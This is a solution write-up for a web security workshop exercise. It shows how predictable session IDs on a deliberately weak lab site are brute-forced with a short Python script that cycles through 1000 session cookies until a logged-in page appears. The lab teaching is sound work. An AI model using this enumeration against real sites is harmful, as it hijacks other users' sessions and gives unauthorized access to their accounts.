## Workshop 2 Solutions
### 3 - Carol
Relevant information:

- Carol uses the v0 version of the site.
- The v0 version of the site creates session IDs manually.
- v0 session IDs are of the form: USERNAME-SESSION-###

It should be immediately obvious that session IDs can be enumerated via brute-force. For Carol, there are only 1000 possible IDs: CAROL-SESSION-000 through CAROL-SESSION-999. I used a python script to GET profile.php with all possible session IDs, and print the resulting HTML if it contains "Welcome" (indicating the login was a success).

```python
for i in range(1000):
    cookie = {"PHPSESSID" : "CAROL-SESSION-{:03d}".format(i)}
    r = requests.get("http://172.16.4.59/profile.php", cookies=cookie)
    if "Welcome" in r.text:
        print(r.text)
```

This is the least practical exercise of the workshop, but it provides an introduction to the concept of a session ID and provides an example of when something can be trivially brute-forced.
